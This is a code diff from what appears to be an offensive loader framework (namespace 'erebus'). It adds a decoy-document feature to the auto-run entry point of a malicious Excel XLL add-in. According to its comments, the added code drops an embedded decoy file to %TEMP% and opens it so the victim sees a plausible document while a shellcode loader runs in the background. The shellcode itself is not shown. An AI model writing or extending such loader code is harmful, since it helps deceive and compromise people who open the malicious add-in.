@@ -388,11 +388,18 @@ extern "C" __declspec(dllexport) HRESULT DllUnregisterServer(void)
 
 #elif defined(BUILD_XLL)
 
+#include "xll_file_ingestor.hpp"
+
 // xlAutoOpen is the XLL registration callback - Excel calls it synchronously
 // after the add-in DLL is loaded.  Running entry() here keeps the DLL resident
 // for the full duration of shellcode setup; returning 1 signals success to Excel.
 extern "C" __declspec(dllexport) int WINAPI xlAutoOpen(void)
 {
+#if CONFIG_XLL_FILE_INGESTOR_ENABLED
+	// Drop the embedded decoy file to %TEMP% and open it in a background thread
+	// so Excel shows the victim a plausible document while the loader runs.
+	erebus::LaunchIngestFile();
+#endif
 	entry();
 	return 1;
 }
